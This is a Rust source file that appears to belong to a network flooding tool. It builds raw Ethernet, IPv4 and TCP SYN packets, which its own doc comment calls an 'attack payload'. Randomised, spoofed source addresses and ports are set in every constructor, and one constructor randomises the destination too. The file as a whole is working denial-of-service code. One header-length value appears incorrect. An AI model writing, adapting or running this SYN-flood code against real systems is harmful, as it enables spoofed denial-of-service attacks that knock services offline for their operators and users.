use std::net::Ipv4Addr;

use pnet::packet::{ethernet, ip, ipv4, tcp};
use pnet::{datalink, util::MacAddr};

use crate::util::get_random_ip;
use crate::Result;

/// A attack payload for a SYN packet.
pub struct SynPayload {
    /// The source IP address.
    pub src_ip: Ipv4Addr,
    /// The destination IP address.
    pub dst_ip: Ipv4Addr,
    /// The source and destination port.
    pub src_port: u16,
    /// The source and destination port.
    pub dst_port: u16,
    /// The network interface to send the packet from.
    pub interface: datalink::NetworkInterface,
}

impl SynPayload {
    pub fn new(dst_ip: Ipv4Addr, dst_port: u16, interface: &datalink::NetworkInterface) -> Self {
        Self {
            src_ip: get_random_ip(),
            dst_ip,
            src_port: fastrand::u16(1024..65535),
            dst_port,
            interface: interface.clone(),
        }
    }

    pub fn random(interface: &datalink::NetworkInterface) -> Self {
        Self {
            src_ip: get_random_ip(),
            dst_ip: get_random_ip(),
            src_port: fastrand::u16(1024..65535),
            dst_port: fastrand::u16(1..65535),
            interface: interface.clone(),
        }
    }

    pub fn source_ip(&mut self, src_ip: Ipv4Addr) {
        self.src_ip = src_ip;
    }

    pub fn destination_ip(&mut self, dst_ip: Ipv4Addr) {
        self.dst_ip = dst_ip;
    }

    pub fn source_port(&mut self, src_port: u16) {
        self.src_port = src_port;
    }

    pub fn destination_port(&mut self, dst_port: u16) {
        self.dst_port = dst_port;
    }
}

impl super::Payload for SynPayload {
    fn build(&mut self, packet: &mut [u8]) -> Result<()> {
        {
            let mut ethernet_header =
                ethernet::MutableEthernetPacket::new(&mut packet[..super::PKT_ETH_SIZE])
                    .ok_or(crate::error::Error::BufferTooSmall)?;
            ethernet_header.set_destination(MacAddr::broadcast());
            ethernet_header.set_source(self.interface.mac.ok_or(
                crate::error::Error::InvalidInterface(format!(
                    "Mac address for {} is not found",
                    self.interface.name
                )),
            )?);
            ethernet_header.set_ethertype(ethernet::EtherTypes::Ipv4);
        }

        {
            let mut ipv4_header = ipv4::MutableIpv4Packet::new(
                &mut packet[super::PKT_ETH_SIZE..(super::PKT_ETH_SIZE + super::PKT_IPV4_SIZE)],
            )
            .ok_or(crate::error::Error::BufferTooSmall)?;
            ipv4_header.set_header_length(69);
            ipv4_header.set_total_length(52);
            ipv4_header.set_next_level_protocol(ip::IpNextHeaderProtocols::Tcp);
            ipv4_header.set_source(self.src_ip);
            ipv4_header.set_destination(self.dst_ip);
            ipv4_header.set_identification(fastrand::u16(..));
            ipv4_header.set_ttl(64);
            ipv4_header.set_version(4);
            ipv4_header.set_flags(ipv4::Ipv4Flags::DontFragment);

            let checksum = ipv4::checksum(&ipv4_header.to_immutable());
            ipv4_header.set_checksum(checksum);
        }

        {
            let mut tcp_header = tcp::MutableTcpPacket::new(
                &mut packet[(super::PKT_ETH_SIZE + super::PKT_IPV4_SIZE)..],
            )
            .ok_or(crate::error::Error::BufferTooSmall)?;

            tcp_header.set_source(self.src_port);
            tcp_header.set_destination(self.dst_port);

            tcp_header.set_flags(tcp::TcpFlags::SYN);
            tcp_header.set_window(64240);
            tcp_header.set_data_offset(8);
            tcp_header.set_urgent_ptr(0);
            tcp_header.set_sequence(0);

            tcp_header.set_options(&[
                tcp::TcpOption::mss(1460),
                tcp::TcpOption::sack_perm(),
                tcp::TcpOption::nop(),
                tcp::TcpOption::nop(),
                tcp::TcpOption::wscale(7),
            ]);

            let checksum =
                tcp::ipv4_checksum(&tcp_header.to_immutable(), &self.src_ip, &self.dst_ip);
            tcp_header.set_checksum(checksum);
        }

        Ok(())
    }
}
